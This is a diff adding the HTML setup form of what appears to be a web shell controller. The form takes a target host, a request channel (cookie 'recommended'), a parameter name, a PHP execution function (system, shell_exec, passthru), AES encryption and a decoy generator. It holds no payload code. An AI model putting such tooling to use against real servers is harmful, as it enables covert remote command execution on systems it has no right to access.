@@ -1,0 +1,63 @@
+<section id="setup">
+    <div class="row">
+        <div class="col-xs-12">
+            <h2>Finder</h2>
+        </div>
+    </div>
+
+    <div class="row">
+        <div class="col-sm-12">
+            <form id="setup-form">
+                <div class="form-group">
+                    <label for="host">Host</label>
+                    <input class="form-control" id="host" type="text" name="host">
+                </div>
+
+                <div class="form-group">
+                    <label for="method">Method</label>
+                    <select class="form-control" id="method" name="method">
+                        <option value="0">GET (not recommended)</option>
+                        <option value="1">POST</option>
+                        <option value="2">HEADER</option>
+                    <option value="3">COOKIE (recommended)</option>
+                    </select>
+                </div>
+
+                <div class="form-group" class="method-abstract">
+                    <label for="parameter">Parameter name (Dec by default)</label>
+                    <input class="form-control" id="parameter" type="text" name="parameter">
+                </div>
+
+                <div class="form-group">
+                    <label for="shell">Shell Method</label>
+                    <select class="form-control" id="shell" name="shell">
+                        <option value="0">system</option>
+                        <option value="1">shell_exec</option>
+                        <option value="2">passthru</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label for="crypt">Crypt</label>
+                    <select class="form-control" id="crypt" name="crypt">
+                        <option value="0">No</option>
+                        <option value="1">Yes</option>
+                    </select>
+                </div>
+
+                <div class="form-group hidden" class="crypt-abstract">
+                    <label for="crypt-method">Crypt method</label>
+                    <select class="form-control" id="crypt-method" name="crypt-method">
+                        <option value="0">Default (Crypto.js AES)</option>
+                        <option value="1">Custom</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <input type="submit" class="btn btn-success" value="Setup" id="setup-submit">
+                    <button class="btn btn-info" id="setup-generate-decoy">Generate Decoy</button>
+                </div>
+            </form>
+        </div>
+    </div>
+</section>    
